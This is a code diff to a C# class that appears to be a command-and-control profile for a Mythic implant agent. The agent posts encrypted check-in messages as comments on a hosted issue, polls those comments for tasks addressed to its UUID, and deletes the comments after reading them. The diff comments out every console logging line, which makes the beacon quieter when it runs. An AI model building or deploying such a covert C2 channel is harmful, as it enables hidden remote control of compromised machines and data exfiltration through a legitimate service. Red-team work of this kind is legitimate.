@@ -47,8 +47,8 @@ namespace Agent.Profiles
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             // Post Checkin Message
-            Console.WriteLine("Start checkin");
-            Console.WriteLine(agentConfig.uuid);
+            //Console.WriteLIne("Start checkin");
+            //Console.WriteLIne(agentConfig.uuid);
 
             var json = this.crypt.Encrypt(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
             string url = $"{URL}/{CLIENT_ISSUE}/comments";
@@ -58,12 +58,12 @@ namespace Agent.Profiles
             var response = await client.PostAsync(url, content);
             if (response.IsSuccessStatusCode)
             {
-                Console.WriteLine("Comment successfully created.");
+                //Console.WriteLIne("Comment successfully created.");
             }
             else
             {
-                Console.WriteLine($"Failed to create comment. Status code: {response.StatusCode}");
-                Console.WriteLine($"Response: {await response.Content.ReadAsStringAsync()}");
+                //Console.WriteLIne($"Failed to create comment. Status code: {response.StatusCode}");
+                //Console.WriteLIne($"Response: {await response.Content.ReadAsStringAsync()}");
             }
 
             // Wait 3 seconds for Mythic to post a checkin response 
@@ -82,7 +82,7 @@ namespace Agent.Profiles
                 {
                     if (payloadUuid != mythMsg["id"])
                     {
-                        Console.WriteLine($"Updating new UUID to: {mythMsg["id"]}");
+                        //Console.WriteLIne($"Updating new UUID to: {mythMsg["id"]}");
                         this.cir = JsonSerializer.Deserialize<CheckinResponse>(message.Substring(36));
                         this.checkedin = true;
                         await DeleteComment(comment.id);
@@ -97,12 +97,12 @@ namespace Agent.Profiles
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
-            Console.WriteLine(agentConfig.uuid);
+            //Console.WriteLIne(agentConfig.uuid);
             this.cancellationTokenSource = new CancellationTokenSource();
             List<(string id, string body)> comments = new List<(string id, string body)>();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                Console.WriteLine("Checking In");
+                //Console.WriteLIne("Checking In");
                 // Check if we have responses to send
                 if (this.messageManager.HasResponses())
                 {
@@ -118,7 +118,7 @@ namespace Agent.Profiles
                         var payloadUuid = m.Substring(0, 36);
                         if (payloadUuid == agentConfig.uuid)
                         {
-                            Console.WriteLine("New Task received!");
+                            //Console.WriteLIne("New Task received!");
                             GetTaskingResponse gtr = JsonSerializer.Deserialize<GetTaskingResponse>(m.Substring(36));
                             TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                             this.SetTaskingReceived(this, tra);
@@ -162,7 +162,7 @@ namespace Agent.Profiles
 
         private async Task PostComment(string json)
         {
-            Console.WriteLine(json);
+            //Console.WriteLIne(json);
             string msg = this.crypt.Encrypt(json);
             var url = $"{URL}/{CLIENT_ISSUE}/comments";
             var payload = new { body = msg };
@@ -171,12 +171,12 @@ namespace Agent.Profiles
             var response = await client.PostAsync(url, content);
             if (response.IsSuccessStatusCode)
             {
-                Console.WriteLine("Comment successfully created.");
+                //Console.WriteLIne("Comment successfully created.");
             }
             else
             {
-                Console.WriteLine($"Failed to create comment. Status code: {response.StatusCode}");
-                Console.WriteLine($"Response: {await response.Content.ReadAsStringAsync()}");
+                //Console.WriteLIne($"Failed to create comment. Status code: {response.StatusCode}");
+                //Console.WriteLIne($"Response: {await response.Content.ReadAsStringAsync()}");
             }
         }
 
@@ -186,12 +186,12 @@ namespace Agent.Profiles
             HttpResponseMessage response = await client.DeleteAsync(url);
             if (response.IsSuccessStatusCode)
             {
-                Console.WriteLine($"Comment {commentId} successfully deleted.\n");
+                //Console.WriteLIne($"Comment {commentId} successfully deleted.\n");
             }
             else
             {
-                Console.WriteLine($"Failed to delete comment {commentId}. Status code: {response.StatusCode}");
-                Console.WriteLine($"Response: {await response.Content.ReadAsStringAsync()}");
+                //Console.WriteLIne($"Failed to delete comment {commentId}. Status code: {response.StatusCode}");
+                //Console.WriteLIne($"Response: {await response.Content.ReadAsStringAsync()}");
             }
         }
     }
